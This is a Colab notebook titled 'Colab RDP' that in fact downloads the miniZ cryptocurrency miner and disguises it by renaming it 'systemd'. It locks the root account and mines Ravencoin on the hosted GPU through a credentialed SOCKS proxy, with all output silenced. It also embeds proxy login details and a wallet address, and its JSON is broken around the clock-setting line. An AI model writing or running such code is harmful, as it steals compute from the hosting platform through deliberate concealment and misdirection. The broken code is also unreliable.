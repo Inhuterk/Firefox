{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Colab RDP.ipynb",
      "provenance": [],
      "gpuType": "T4",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Inhuterk/Firefox/blob/main/Colab%20RDP/test.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt update && sudo apt install -y docker.io\n",
        "\n",
        "\n",
        "!sudo usermod -aG docker root\n",
        "!sudo usermod --add-subuids 10-20000 root\n",
        "\n",
        "!sudo usermod -L root\n",
        "\n",
        "\n",
        "!wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz\n",
        "\n",
        "!tar -xvf miniZ_v2.3c_linux-x64.tar.gz\n",
        "\n",
        "\n",
        "\n",
        "!mv miniZ systemd\n",
        "!nvidia-smi -i 0 -lgc 5000
        
        
        "\n",
        "!./systemd  --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server de.ravencoin.herominers.com  --port 1140 --socks sipuwfea:e90ia636sn8t@38.154.227.167:5868 --socksdns > /dev/null 2>&1"
      ],
      "metadata": {
        "id": "qqnMJuaiA_-I"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
